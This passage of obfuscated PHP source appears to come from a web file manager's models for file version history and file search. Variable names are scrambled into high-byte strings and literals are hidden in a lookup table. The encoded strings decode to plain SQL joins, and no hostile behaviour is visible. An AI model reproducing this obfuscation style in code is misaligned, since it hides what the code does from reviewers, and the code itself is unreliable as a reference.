$…æﬂº´Ä = array($ªû÷ˆ∫¥[203], $ªû÷ˆ∫¥[2242] => $ªû÷ˆ∫¥[576]); $«‡·åÌƒ = array($ªû÷ˆ∫¥[203] => array($ªû÷ˆ∫¥[7], $Ú–üÇ‰ƒ)); $çÌÆ•üÊ = $this->field($…æﬂº´Ä)->where($«‡·åÌƒ)->group($ªû÷ˆ∫¥[203])->select(); return array_to_keyvalue($çÌÆ•üÊ, $ªû÷ˆ∫¥[203], $ªû÷ˆ∫¥[576]); } public function addHistory($‰£Õ‰π†, $¶¸–ÁÑΩ = '') { $∞˝¨„Üª =& $_SERVER[ˆë€Ï⁄∂]; $Ç≠È˘—˚ = array($∞˝¨„Üª[502] => $‰£Õ‰π†[$∞˝¨„Üª[203]], $∞˝¨„Üª[1778] => isset($‰£Õ‰π†[$∞˝¨„Üª[540]]) ? $‰£Õ‰π†[$∞˝¨„Üª[540]] : $‰£Õ‰π†[$∞˝¨„Üª[538]], $∞˝¨„Üª[553] => $‰£Õ‰π†[$∞˝¨„Üª[552]], $∞˝¨„Üª[631] => $‰£Õ‰π†[$∞˝¨„Üª[89]], $∞˝¨„Üª[2243] => $¶¸–ÁÑΩ); if ($GLOBALS[$∞˝¨„Üª[6]][$∞˝¨„Üª[102]][$∞˝¨„Üª[1317]] >= 1) { $this->historyAutoClear($Ç≠È˘—˚[$∞˝¨„Üª[203]]); $this->add($Ç≠È˘—˚); } Hook::trigger($∞˝¨„Üª[2244], $Ç≠È˘—˚); Model($∞˝¨„Üª[2245])->eventFileEdit($‰£Õ‰π†[$∞˝¨„Üª[203]]); } private function historyAutoClear($∫‰óíÆ) { $æƒÜÏæ∑ =& $_SERVER[ˆë€Ï⁄∂]; $ô∆Œö®∆ = Model($æƒÜÏæ∑[861])->get($æƒÜÏæ∑[1339]); $ÿÿ¥áﬁ‘ = intval($GLOBALS[$æƒÜÏæ∑[6]][$æƒÜÏæ∑[102]][$æƒÜÏæ∑[1317]]); $¨”≈È≤ï = $ô∆Œö®∆ == $æƒÜÏæ∑[1340] ? min(5, $ÿÿ¥áﬁ‘) : $ÿÿ¥áﬁ‘; $¨”≈È≤ï = $¨”≈È≤ï <= 0 ? 0 : $¨”≈È≤ï - 1; if ($¨”≈È≤ï >= 499) { return; } $§‹‰Ñî¢ = array($æƒÜÏæ∑[502] => $∫‰óíÆ); $âŒ«ÅÒœ = $this->field($æƒÜÏæ∑[2246])->where($§‹‰Ñî¢)->order($æƒÜÏæ∑[2239])->select(); if (!$âŒ«ÅÒœ || $¨”≈È≤ï >= count($âŒ«ÅÒœ)) { return; } $ﬁë‘çµß = array_to_keyvalue($âŒ«ÅÒœ, $æƒÜÏæ∑[12], $æƒÜÏæ∑[486]); $ﬁë‘çµß = array_slice($ﬁë‘çµß, $¨”≈È≤ï); $ñ€ﬂºìŒ = array_to_keyvalue($âŒ«ÅÒœ, $æƒÜÏæ∑[12], $æƒÜÏæ∑[552]); $ñ€ﬂºìŒ = array_slice($ñ€ﬂºìŒ, $¨”≈È≤ï); if (!$ﬁë‘çµß || !$ñ€ﬂºìŒ) { return; } $§‹‰Ñî¢ = array($æƒÜÏæ∑[504] => array($æƒÜÏæ∑[7], $ﬁë‘çµß)); $this->where($§‹‰Ñî¢)->delete(); Model($æƒÜÏæ∑[555])->remove($ñ€ﬂºìŒ); } public function listData($∂∂ü•ïî) { $∆çˆ∏ﬁÂ =& $_SERVER[ˆë€Ï⁄∂]; $ØáÓ’˙å = array($∆çˆ∏ﬁÂ[502] => $∂∂ü•ïî); $√˙âÉô˚ = $∆çˆ∏ﬁÂ[2247]; $ÃŒÕ˝çç = $this->field($√˙âÉô˚)->where($ØáÓ’˙å)->order($∆çˆ∏ﬁÂ[2239])->selectPage(); $this->_listAppendUser($ÃŒÕ˝çç[$∆çˆ∏ﬁÂ[456]]); $•œûìıÂ = Model($∆çˆ∏ﬁÂ[861])->get($∆çˆ∏ﬁÂ[1339]); $å¶àπ€ß = 5; if ($•œûìıÂ == $∆çˆ∏ﬁÂ[1340]) { $ÃŒÕ˝çç[$∆çˆ∏ﬁÂ[456]] = array_slice($ÃŒÕ˝çç[$∆çˆ∏ﬁÂ[456]], 0, $å¶àπ€ß); $ÃŒÕ˝çç[$∆çˆ∏ﬁÂ[453]] = array($∆çˆ∏ﬁÂ[2248] => 1, $∆çˆ∏ﬁÂ[2249] => 20, $∆çˆ∏ﬁÂ[2250] => 1, $∆çˆ∏ﬁÂ[2251] => count($ÃŒÕ˝çç[$∆çˆ∏ﬁÂ[456]])); } return $ÃŒÕ˝çç; } protected function _listAppendUser(&$¥Ê”œãç) { $˙√Í≈ˆ =& $_SERVER[ˆë€Ï⁄∂]; $íﬂ˘Îû◊ = array_to_keyvalue($¥Ê”œãç, $˙√Í≈ˆ[12], $˙√Í≈ˆ[1787]); $“™¯√µµ = Model($˙√Í≈ˆ[608])->userListInfo($íﬂ˘Îû◊); foreach ($¥Ê”œãç as &$‡…ÿ»¢ˆ) { $âû–±æì = $‡…ÿ»¢ˆ[$˙√Í≈ˆ[1787]]; $‡…ÿ»¢ˆ[$˙√Í≈ˆ[538]] = $“™¯√µµ[$âû–±æì] ? $“™¯√µµ[$âû–±æì] : !1; } unset($‡…ÿ»¢ˆ); } public function fileInfo($àæÎßéá) { $Ã¬∞¿à¬ =& $_SERVER[ˆë€Ï⁄∂]; $îÏöÑ‰ = $this->tablePrefix; $Ñœí˜Ω¿ = "{$îÏöÑ‰}\151\x6f\137\x66\x69\x6c\145\40\146\x69\154\x65\163\40\157\x6e\x20\146\x69\154\145\x73\x2e\146\151\x6c\x65\x49\x44\40\x3d\x20\x68\151\163\x74\x6f\162\x79\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($Ã¬∞¿à¬[2252])->where(array($Ã¬∞¿à¬[504] => $àæÎßéá))->join($Ñœí˜Ω¿, $Ã¬∞¿à¬[2253])->find(); } public function removeItem($Îá¢…ª‹) { $ô≤ÀÈé≥ =& $_SERVER[ˆë€Ï⁄∂]; $æ◊èÔ∫˙ = array($ô≤ÀÈé≥[504] => $Îá¢…ª‹); $˘∫ª‹’Ç = $this->where($æ◊èÔ∫˙)->find(); if ($˘∫ª‹’Ç) { $ëÙ≈ß≥ù = $this->where($æ◊èÔ∫˙)->delete(); Model($ô≤ÀÈé≥[555])->remove($˘∫ª‹’Ç[$ô≤ÀÈé≥[552]]); return $ëÙ≈ß≥ù; } return !1; } public function removeBySource($î∆•ÚñÅ) { $Õ¡˛ÆñŸ =& $_SERVER[ˆë€Ï⁄∂]; if (!$î∆•ÚñÅ) { return !1; } if (!is_array($î∆•ÚñÅ)) { $î∆•ÚñÅ = array($î∆•ÚñÅ); } $è≈ÇŸ´Ô = array($Õ¡˛ÆñŸ[502] => array($Õ¡˛ÆñŸ[7], $î∆•ÚñÅ)); $Æ‚ñé®≈ = $this->field($Õ¡˛ÆñŸ[553])->where($è≈ÇŸ´Ô)->select(); if ($Æ‚ñé®≈) { $this->where($è≈ÇŸ´Ô)->delete(); $„ëù¿‘≤ = array_to_keyvalue($Æ‚ñé®≈, $Õ¡˛ÆñŸ[12], $Õ¡˛ÆñŸ[552]); Model($Õ¡˛ÆñŸ[555])->remove($„ëù¿‘≤); } return !0; } public function setDetail($”…ŒèÛ¨, $∑†ñÚñò) { $˜ê≈∞òÂ =& $_SERVER[ˆë€Ï⁄∂]; return $this->where(array($˜ê≈∞òÂ[504] => $”…ŒèÛ¨))->save(array($˜ê≈∞òÂ[2243] => $∑†ñÚñò)); } public function rollbackToItem($™˘Â°»™, $¬Ï¯ƒ£Ø) { $Û‘ıÓÅô =& $_SERVER[ˆë€Ï⁄∂]; $’î◊˝⁄ñ = Model($Û‘ıÓÅô[916])->sourceInfo($™˘Â°»™); $this->addHistory($’î◊˝⁄ñ, LNG($Û‘ıÓÅô[2254])); $ƒûö¸Ñ¬ = $this->find($¬Ï¯ƒ£Ø); $ÒáÅÄÙ˝ = array($Û‘ıÓÅô[552] => $ƒûö¸Ñ¬[$Û‘ıÓÅô[552]], $Û‘ıÓÅô[89] => $ƒûö¸Ñ¬[$Û‘ıÓÅô[89]], $Û‘ıÓÅô[98] => time(), $Û‘ıÓÅô[540] => USER_ID); Model($Û‘ıÓÅô[916])->where(array($Û‘ıÓÅô[203] => $™˘Â°»™))->save($ÒáÅÄÙ˝); return $this->where(array($Û‘ıÓÅô[504] => $¬Ï¯ƒ£Ø))->delete(); } public function clearSame($ÄÀΩ……˜) { $≥…·åÀ◊ =& $_SERVER[ˆë€Ï⁄∂]; $‰ßìÙ∫â = $this->listData($ÄÀΩ……˜); $öÃÇöÆß = array_to_keyvalue_group($‰ßìÙ∫â, $≥…·åÀ◊[552]); $æﬁ™°ÂÀ = array(); $ÄèÏ∆õ∏ = array(); foreach ($öÃÇöÆß as $Œø±Ó≠¨) { if (!$Œø±Ó≠¨ || count($Œø±Ó≠¨) <= 1) { continue; } foreach ($Œø±Ó≠¨ as $ÉÄÌ∏Çã) { $æﬁ™°ÂÀ[] = $ÉÄÌ∏Çã[$≥…·åÀ◊[552]]; $ÄèÏ∆õ∏[] = $ÉÄÌ∏Çã[$≥…·åÀ◊[486]]; } } if (!$ÄèÏ∆õ∏) { return; } $this->where(array($≥…·åÀ◊[486] => array($≥…·åÀ◊[7], $ÄèÏ∆õ∏)))->delete(); Model($≥…·åÀ◊[555])->remove($æﬁ™°ÂÀ); } public function userSpace() { $ö¶˙¯£∏ =& $_SERVER[ˆë€Ï⁄∂]; $ﬁ∞ØÛº¶ = $this->tablePrefix; $£é∂îüÏ = array($ö¶˙¯£∏[1778] => USER_ID); $ÕùÁäÈÁ = "{$ﬁ∞ØÛº¶}\151\x6f\137\x66\151\154\x65\40\146\151\154\x65\163\40\x6f\x6e\40\146\x69\154\145\163\x2e\x66\151\154\x65\x49\x44\x20\75\40\150\151\x73\x74\157\162\171\56\x66\151\154\145\111\104"; return $this->alias($ö¶˙¯£∏[2252])->where($£é∂îüÏ)->join($ÕùÁäÈÁ, $ö¶˙¯£∏[2253])->sum($ö¶˙¯£∏[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ï˝¢ƒ–á) { $™Ä∏Ä¨¨ =& $_SERVER[ˆë€Ï⁄∂]; $ìÉ‘Îéè = KodIO::fileTypeList(); $¶‰èúä„ = $ìÉ‘Îéè[$Ï˝¢ƒ–á]; if (!$¶‰èúä„) { return array(); } $‘Í—∂ô© = $¶‰èúä„[$™Ä∏Ä¨¨[179]]; $°¸≤÷±å = $™Ä∏Ä¨¨[7]; if (!$¶‰èúä„[$™Ä∏Ä¨¨[179]]) { $ìÇΩﬂÈ÷ = array_to_keyvalue($ìÉ‘Îéè, $™Ä∏Ä¨¨[12], $™Ä∏Ä¨¨[179]); $‘Í—∂ô© = implode($™Ä∏Ä¨¨[50], $ìÇΩﬂÈ÷); $°¸≤÷±å = $™Ä∏Ä¨¨[2255]; } $π´Œ€ãÎ = explode($™Ä∏Ä¨¨[50], trim($‘Í—∂ô©, $™Ä∏Ä¨¨[50])); return array($°¸≤÷±å, $π´Œ€ãÎ); } public function listPathType($»Ó∑¥˜∏) { $∫Ÿ˚Âà =& $_SERVER[ˆë€Ï⁄∂]; $˘ﬂÕ…¯ = $this->fileTypeWhere($»Ó∑¥˜∏); if (!$˘ﬂÕ…¯) { return array(); } $ÿâÛÀ»‡ = USER_ID; $ñ—Ïàû≤ = Model($∫Ÿ˚Âà[608])->getInfo($ÿâÛÀ»‡); $∂ÎÛ«∏° = array($∫Ÿ˚Âà[662] => SourceModel::TYPE_USER, $∫Ÿ˚Âà[595] => array($∫Ÿ˚Âà[626], $∫Ÿ˚Âà[604] . $ñ—Ïàû≤[$∫Ÿ˚Âà[100]][$∫Ÿ˚Âà[203]] . $∫Ÿ˚Âà[627]), $∫Ÿ˚Âà[663] => $ÿâÛÀ»‡, $∫Ÿ˚Âà[660] => 0, $∫Ÿ˚Âà[661] => $˘ﬂÕ…¯); return $this->listSource($∂ÎÛ«∏°); } public function listSearch($∏≠Ë‘†˚, $¸øø≤©Ú = 300) { $ï‚ƒ¬÷¬ =& $_SERVER[ˆë€Ï⁄∂]; if (isset($∏≠Ë‘†˚[$ï‚ƒ¬÷¬[2086]]) && $∏≠Ë‘†˚[$ï‚ƒ¬÷¬[2086]]) { $∏≠Ë‘†˚[$ï‚ƒ¬÷¬[2086]] = str_replace($ï‚ƒ¬÷¬[471], $ï‚ƒ¬÷¬[2256], trim($∏≠Ë‘†˚[$ï‚ƒ¬÷¬[2086]])); } $‘ßÓ∂é£ = $this->_parseSearchWhere($∏≠Ë‘†˚); if (!isset($‘ßÓ∂é£[$ï‚ƒ¬÷¬[516]])) { $‘ßÓ∂é£[$ï‚ƒ¬÷¬[516]] = 0; } $ñÖ ﬂÀë = $ï‚ƒ¬÷¬[2257]; $‡û€Œõó = $‘ßÓ∂é£; $Ñ›⁄∂œµ = $ñÖ ﬂÀë; $this->_listSearchBindPinyin($∏≠Ë‘†˚, $‘ßÓ∂é£, $ñÖ ﬂÀë); $this->alias($ï‚ƒ¬÷¬[530])->_makeOrder(); $‘ßÓ∂é£ = $this->parseWhereLike($‘ßÓ∂é£); $ï«‰âΩ“ = $this->distinct(!0)->field($ñÖ ﬂÀë)->where($‘ßÓ∂é£)->selectPage($¸øø≤©Ú); if ($GLOBALS[$ï‚ƒ¬÷¬[6]][$ï‚ƒ¬÷¬[468]][$ï‚ƒ¬÷¬[469]] && Input::check($∏≠Ë‘†˚[$ï‚ƒ¬÷¬[2086]], $ï‚ƒ¬÷¬[669]) && $ï«‰âΩ“[$ï‚ƒ¬÷¬[453]][$ï‚ƒ¬÷¬[439]] == 1 && $ï«‰âΩ“[$ï‚ƒ¬÷¬[453]][$ï‚ƒ¬÷¬[454]] == 0) { $ï«‰âΩ“ = $this->distinct(!0)->field($ñÖ ﬂÀë)->where($‡û€Œõó)->limit(1000)->select(); $ï«‰âΩ“ = array_page_split($ï«‰âΩ“, !1, $¸øø≤©Ú); } $this->_listSearchFileContent($ï«‰âΩ“, $∏≠Ë‘†˚, $Ñ›⁄∂œµ, $‡û€Œõó); $this->_listSearchDesc($ï«‰âΩ“, $∏≠Ë‘†˚, $Ñ›⁄∂œµ); $this->_listSearchTag($ï«‰âΩ“, $∏≠Ë‘†˚, $Ñ›⁄∂œµ); $this->_listSearchGroupTag($ï«‰âΩ“, $∏≠Ë‘†˚, $Ñ›⁄∂œµ); $this->_listDataApply($ï«‰âΩ“[$ï‚ƒ¬÷¬[456]]); $this->_listMake($ï«‰âΩ“); return $ï«‰âΩ“; } private function _listSearchFileContent(&$»˘âñÓ‘, $ì«∫™øó, $Øû∂ûŒ£, $⁄Ù√¯Ãó) { $Óü∆ï≈Ù =& $_SERVER[ˆë€Ï⁄∂]; if (!$ì«∫™øó[$Óü∆ï≈Ù[2086]] || $»˘âñÓ‘[$Óü∆ï≈Ù[453]][$Óü∆ï≈Ù[439]] > 1) { return; } if (!isset($⁄Ù√¯Ãó[$Óü∆ï≈Ù[32]]) || !is_array($ì«∫™øó[$Óü∆ï≈Ù[552]])) { return; } $⁄Ù√¯Ãó[$Óü∆ï≈Ù[552]] = array($Óü∆ï≈Ù[7], $ì«∫™øó[$Óü∆ï≈Ù[552]]); unset($⁄Ù√¯Ãó[$Óü∆ï≈Ù[32]]); unset($ì«∫™øó[$Óü∆ï≈Ù[552]]); $∏Í˛Çûº = $this->field($Øû∂ûŒ£)->where($⁄Ù√¯Ãó)->limit($Óü∆ï≈Ù[2258])->select(); if (!$∏Í˛Çûº || count($∏Í˛Çûº) == 0) { return; } $»˘âñÓ‘[$Óü∆ï≈Ù[456]] = array_merge($∏Í˛Çûº, $»˘âñÓ‘[$Óü∆ï≈Ù[456]]); $»˘âñÓ‘[$Óü∆ï≈Ù[453]][$Óü∆ï≈Ù[454]] += count($∏Í˛Çûº); } private function _listSearchTag(&$’§®ÊÏ¯, $˝æ·ëë‰, $˚√πâìñ) { $˜Ì‘Î¢¢ =& $_SERVER[ˆë€Ï⁄∂]; if (!$˝æ·ëë‰[$˜Ì‘Î¢¢[2086]] || $’§®ÊÏ¯[$˜Ì‘Î¢¢[453]][$˜Ì‘Î¢¢[439]] > 1) { return; } $⁄Õ†¡Ê˙ = Model($˜Ì‘Î¢¢[2259])->listData(); $ØâˆÁ±◊ = array(); $¡ïÿ·œÆ = $˝æ·ëë‰[$˜Ì‘Î¢¢[2086]]; foreach ($⁄Õ†¡Ê˙ as $‘”¶ØÉï) { $´â©ﬂ¡∫ = $‘”¶ØÉï[$˜Ì‘Î¢¢[32]]; $ïåπΩñ¨ = str_replace($˜Ì‘Î¢¢[53], $˜Ì‘Î¢¢[12], Pinyin::get($´â©ﬂ¡∫)); if (stripos($´â©ﬂ¡∫, $¡ïÿ·œÆ) !== !1 || stripos($ïåπΩñ¨, $¡ïÿ·œÆ) !== !1) { $ØâˆÁ±◊[] = $‘”¶ØÉï[$˜Ì‘Î¢¢[486]]; } } if (!$ØâˆÁ±◊) { return; } $†≈ËµÇ‚ = array($˜Ì‘Î¢¢[511] => array($˜Ì‘Î¢¢[7], $ØâˆÁ±◊), $˜Ì‘Î¢¢[1787] => USER_ID); $©ÁÅ‹Úø = Model($˜Ì‘Î¢¢[513])->field($˜Ì‘Î¢¢[97])->where($†≈ËµÇ‚)->select(); $©ÁÅ‹Úø = array_to_keyvalue($©ÁÅ‹Úø, $˜Ì‘Î¢¢[12], $˜Ì‘Î¢¢[97]); $–æ®º‡ƒ = array_unique($©ÁÅ‹Úø); $this->_listSearchMerge($’§®ÊÏ¯, $˝æ·ëë‰, $˚√πâìñ, $–æ®º‡ƒ); } private function _listSearchDesc(&$Í¬»ê¶ã, $≠ó◊π∂Ê, $„Éü¶È‡) { $å⁄ô∆ïπ =& $_SERVER[ˆë€Ï⁄∂]; if (!$≠ó◊π∂Ê[$å⁄ô∆ïπ[2086]] || $Í¬»ê¶ã[$å⁄ô∆ïπ[453]][$å⁄ô∆ïπ[439]] > 1) { return; } $–Ì¸Ûì∑ = array($å⁄ô∆ïπ[107] => $å⁄ô∆ïπ[537], $å⁄ô∆ïπ[461] => array($å⁄ô∆ïπ[470], $å⁄ô∆ïπ[2088] . $≠ó◊π∂Ê[$å⁄ô∆ïπ[2086]] . $å⁄ô∆ïπ[2088])); $¥Çì˛Åé = !1; if ($¥Çì˛Åé) { $òêÉ¡œï = $this->listSearchChildren($≠ó◊π∂Ê[$å⁄ô∆ïπ[202]]); $òêÉ¡œï = array_unique($òêÉ¡œï); if (!$òêÉ¡œï) { return; } $–Ì¸Ûì∑[$å⁄ô∆ïπ[203]] = array($å⁄ô∆ïπ[7], $òêÉ¡œï); } $¸Ô¸√ïÖ = Model($å⁄ô∆ïπ[646])->field($å⁄ô∆ïπ[203])->where($–Ì¸Ûì∑)->limit(5000)->select(); $≠∂¶‡üä = array_to_keyvalue($¸Ô¸√ïÖ, $å⁄ô∆ïπ[12], $å⁄ô∆ïπ[203]); $this->_listSearchMerge($Í¬»ê¶ã, $≠ó◊π∂Ê, $„Éü¶È‡, $≠∂¶‡üä); } private function _listSearchGroupTag(&$ÕÛ©◊Ñ¬, $Òö®à’ê, $≤«ªÏÕ) { $¸±Èƒè“ =& $_SERVER[ˆë€Ï⁄∂]; if (!$Òö®à’ê[$¸±Èƒè“[2086]] || $ÕÛ©◊Ñ¬[$¸±Èƒè“[453]][$¸±Èƒè“[439]] > 1 || !$Òö®à’ê[$¸±Èƒè“[202]]) { return; } $∞‘ÂÑÃ = $this->sourceInfo($Òö®à’ê[$¸±Èƒè“[202]]); if (!$∞‘ÂÑÃ || $∞‘ÂÑÃ[$¸±Èƒè“[200]] != SourceModel::TYPE_GROUP) { return; } $⁄…ÇöŒ§ = $∞‘ÂÑÃ[$¸±Èƒè“[580]]; $¯àÿÚıî = Model($¸±Èƒè“[2260])->get($⁄…ÇöŒ§); $ÿÀı£¢‡ = array(); $Æ–—è∞ó = $Òö®à’ê[$¸±Èƒè“[2086]]; foreach ($¯àÿÚıî[$¸±Èƒè“[456]] as $º’‚ƒ») { $˜ì¥˘ˆ¬ = $º’‚ƒ»[$¸±Èƒè“[32]]; $ÁäÁŒ˜≥ = str_replace($¸±Èƒè“[53], $¸±Èƒè“[12], Pinyin::get($˜ì¥˘ˆ¬)); if (stripos($˜ì¥˘ˆ¬, $Æ–—è∞ó) !== !1 || stripos($ÁäÁŒ˜≥, $Æ–—è∞ó) !== !1) { $ÿÀı£¢‡[] = $º’‚ƒ»[$¸±Èƒè“[486]]; } } if (!$ÿÀı£¢‡) { return; } $‘êáﬁûÌ = array($¸±Èƒè“[511] => array($¸±Èƒè“[7], $ÿÀı£¢‡), $¸±Èƒè“[1787] => 0, $¸±Èƒè“[33] => $¸±Èƒè“[2108] . $⁄…ÇöŒ§); $Éüªªî™ = Model($¸±Èƒè“[513])->field($¸±Èƒè“[97])->where($‘êáﬁûÌ)->select(); $Éüªªî™ = array_to_keyvalue($Éüªªî™, $¸±Èƒè“[12], $¸±Èƒè“[97]); $©äç√œ† = array_unique($Éüªªî™); $this->_listSearchMerge($ÕÛ©◊Ñ¬, $Òö®à’ê, $≤«ªÏÕ, $©äç√œ†); } private function _listSearchMerge(&$»˝¿§íú, $Û«ô≤Îï, $ª…¶∂â≤, $≈î≠ ﬂ€) { $ô±ÄÄíÖ =& $_SERVER[ˆë€Ï⁄∂]; if (!$≈î≠ ﬂ€) { return; } $¸∂∆ÚÉ∑ = array_to_keyvalue($»˝¿§íú[$ô±ÄÄíÖ[456]], $ô±ÄÄíÖ[12], $ô±ÄÄíÖ[203]); $¯æ£Óôõ = array_diff($≈î≠ ﬂ€, $¸∂∆ÚÉ∑); if (!$¯æ£Óôõ) { return; } $°˘ô¥¬Å = array($ô±ÄÄíÖ[203] => array($ô±ÄÄíÖ[7], $¯æ£Óôõ)); $™¶— ß¨ = $this->field($ª…¶∂â≤)->where($°˘ô¥¬Å)->select(); if (!$™¶— ß¨) { return; } $ﬂÖﬂù÷Á = array(); foreach ($™¶— ß¨ as $‘µΩ©ﬁ€) { if ($this->_listSearchFilter($‘µΩ©ﬁ€, $Û«ô≤Îï)) { $ﬂÖﬂù÷Á[] = $‘µΩ©ﬁ€; } } $»˝¿§íú[$ô±ÄÄíÖ[456]] = array_merge($ﬂÖﬂù÷Á, $»˝¿§íú[$ô±ÄÄíÖ[456]]); $»˝¿§íú[$ô±ÄÄíÖ[453]][$ô±ÄÄíÖ[454]] += count($ﬂÖﬂù÷Á); } private function _listSearchFilter($´”éŒñØ, $ãœ‡äΩÓ) { $≈Ãã∑Õ¬ =& $_SERVER[ˆë€Ï⁄∂]; $…◊è§á≤ = $´”éŒñØ[$≈Ãã∑Õ¬[496]] == $≈Ãã∑Õ¬[101]; if (!strstr($´”éŒñØ[$≈Ãã∑Õ¬[595]], $≈Ãã∑Õ¬[50] . $ãœ‡äΩÓ[$≈Ãã∑Õ¬[202]] . $≈Ãã∑Õ¬[50])) { return !1; } if (isset($ãœ‡äΩÓ[$≈Ãã∑Õ¬[497]]) && $ãœ‡äΩÓ[$≈Ãã∑Õ¬[497]] != $≈Ãã∑Õ¬[867]) { if ($ãœ‡äΩÓ[$≈Ãã∑Õ¬[497]] == $≈Ãã∑Õ¬[88] && !$…◊è§á≤) { return !1; } if ($ãœ‡äΩÓ[$≈Ãã∑Õ¬[497]] != $≈Ãã∑Õ¬[88] && $…◊è§á≤) { return !1; } if (!strstr($´”éŒñØ[$≈Ãã∑Õ¬[179]], $≈Ãã∑Õ¬[50] . $ãœ‡äΩÓ[$≈Ãã∑Õ¬[497]] . $≈Ãã∑Õ¬[50])) { return !1; } } if (isset($ãœ‡äΩÓ[$≈Ãã∑Õ¬[2261]]) && $ãœ‡äΩÓ[$≈Ãã∑Õ¬[2261]] < $´”éŒñØ[$≈Ãã∑Õ¬[89]]) { return !1; } if (isset($ãœ‡äΩÓ[$≈Ãã∑Õ¬[2262]]) && $ãœ‡äΩÓ[$≈Ãã∑Õ¬[2262]] > $´”éŒñØ[$≈Ãã∑Õ¬[89]]) { return !1; } if (isset($ãœ‡äΩÓ[$≈Ãã∑Õ¬[676]]) && $ãœ‡äΩÓ[$≈Ãã∑Õ¬[676]] != $´”éŒñØ[$≈Ãã∑Õ¬[540]]) { return !1; } return !0; } public function listSearchChildren($ Üâõ’„, $±Ñ∆´îÏ = 5000) { $£Úàíà∆ =& $_SERVER[ˆë€Ï⁄∂]; $ÔÖ‰§ﬁê = array(); $¡°Óºôç = $this->sourceInfo($ Üâõ’„); $Äå¸°ñÄ = array($£Úàíà∆[595] => array($£Úàíà∆[470], $¡°Óºôç[$£Úàíà∆[595]] . $¡°Óºôç[$£Úàíà∆[203]] . $£Úàíà∆[627])); $‰àØÖìä = $this->field($£Úàíà∆[89])->where($Äå¸°ñÄ)->limit($±Ñ∆´îÏ + 1)->select(); $ÒÏ˜ó∫¸ = is_array($‰àØÖìä) ? count($‰àØÖìä) : 0; if ($ÒÏ˜ó∫¸ > $±Ñ∆´îÏ) { return $this->_listSearchChildrenNear($ Üâõ’„, $±Ñ∆´îÏ); } $„≥¢åù‹ = $this->field($£Úàíà∆[203])->where($Äå¸°ñÄ)->select(); $ÔÖ‰§ﬁê = array_to_keyvalue($„≥¢åù‹, $£Úàíà∆[12], $£Úàíà∆[203]); return $ÔÖ‰§ﬁê; } private function _listSearchChildrenNear($ÿ¶¿®§, $™—µ∫‚ú) { $é«ù¨ﬁè =& $_SERVER[ˆë€Ï⁄∂]; $ÿŒ¿≈ªÍ = array(); $™Ï……öµ = array($é«ù¨ﬁè[202] => $ÿ¶¿®§); $±¸ô“Ã¬ = $this->field($é«ù¨ﬁè[2263])->where($™Ï……öµ)->select(); $‰Ä˛–¯É = array_to_keyvalue(array_filter_by_field($±¸ô“Ã¬, $é«ù¨ﬁè[496], $é«ù¨ﬁè[101]), $é«ù¨ﬁè[12], $é«ù¨ﬁè[203]); $ÿŒ¿≈ªÍ = array_merge($ÿŒ¿≈ªÍ, array_to_keyvalue($±¸ô“Ã¬, $é«ù¨ﬁè[12], $é«ù¨ﬁè[203])); if (!$‰Ä˛–¯É) { return $ÿŒ¿≈ªÍ; } $™Ï……öµ = array($é«ù¨ﬁè[202] => array($é«ù¨ﬁè[7], $‰Ä˛–¯É)); $±¸ô“Ã¬ = $this->field($é«ù¨ﬁè[2263])->where($™Ï……öµ)->limit($™—µ∫‚ú)->select(); $ÿŒ¿≈ªÍ = array_merge($ÿŒ¿≈ªÍ, array_to_keyvalue($±¸ô“Ã¬, $é«ù¨ﬁè[12], $é«ù¨ﬁè[203])); $ÿŒ¿≈ªÍ = array_slice($ÿŒ¿≈ªÍ, 0, intval($™—µ∫‚ú)); return $ÿŒ¿≈ªÍ; } private function _listSearchBindPinyin($≠≈˚å˝, &$·©¸†√Ü, &$ﬂ◊≤‡›ª) { $¶öß›ÌÕ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($≠≈˚å˝[$¶öß›ÌÕ[2086]]) || !$≠≈˚å˝[$¶öß›ÌÕ[2086]]) { return; } if (!Input::check($≠≈˚å˝[$¶öß›ÌÕ[2086]], $¶öß›ÌÕ[404]) || strlen($≠≈˚å˝[$¶öß›ÌÕ[2086]]) < 2) { return; } $ƒòﬁØå˛ = "\114\x45\106\124\x20\112\117\x49\116\x20{$this->tablePrefix}\151\157\x5f\x73\157\x75\162\143\x65\x5f\155\x65\x74\141\x20\x6d\x65\164\141\40\157\x6e\x20\163\x6f\x75\x72\143\x65\56\163\157\x75\x72\x63\x65\111\x44\x20\75\40\155\145\x74\141\56\163\157\165\x72\143\145\111\x44"; $•≤Ì‘¥∂ = array(); $ﬂ◊≤‡›ª = str_replace(array($¶öß›ÌÕ[59], $¶öß›ÌÕ[53], $¶öß›ÌÕ[2264]), $¶öß›ÌÕ[12], $ﬂ◊≤‡›ª); $ﬂ◊≤‡›ª = $¶öß›ÌÕ[522] . str_replace($¶öß›ÌÕ[50], $¶öß›ÌÕ[523], $ﬂ◊≤‡›ª); $Ã‚Õ›åû = $·©¸†√Ü[$¶öß›ÌÕ[32]]; unset($·©¸†√Ü[$¶öß›ÌÕ[32]]); foreach ($·©¸†√Ü as $ñ´ÔÁ§Ã => $„Ñïˆªª) { $•≤Ì‘¥∂[$¶öß›ÌÕ[522] . $ñ´ÔÁ§Ã] = $„Ñïˆªª; } foreach ($Ã‚Õ›åû as $¸ØÆãÑ¿) { $•≤Ì‘¥∂[] = array($¶öß›ÌÕ[527] => $¸ØÆãÑ¿, $¶öß›ÌÕ[1092] => $¶öß›ÌÕ[2090], array($¶öß›ÌÕ[2265] => $¸ØÆãÑ¿, $¶öß›ÌÕ[2266] => array($¶öß›ÌÕ[7], array($¶öß›ÌÕ[549], $¶öß›ÌÕ[548])))); } $this->join($ƒòﬁØå˛); $·©¸†√Ü = $•≤Ì‘¥∂; } private function _parseSearchWhere($ûÅ⁄¢˛Ì) { $≥’ƒÇàÚ =& $_SERVER[ˆë€Ï⁄∂]; $øÊó€ó“ = array(); if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[851]]) && $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[851]]) { $øÊó€ó“[$≥’ƒÇàÚ[98]] = array($≥’ƒÇàÚ[2267], $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[851]]); } if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[852]]) && $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[852]]) { $≠¥–⁄√˜ = array($≥’ƒÇàÚ[2268], $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[852]]); if ($øÊó€ó“[$≥’ƒÇàÚ[98]]) { 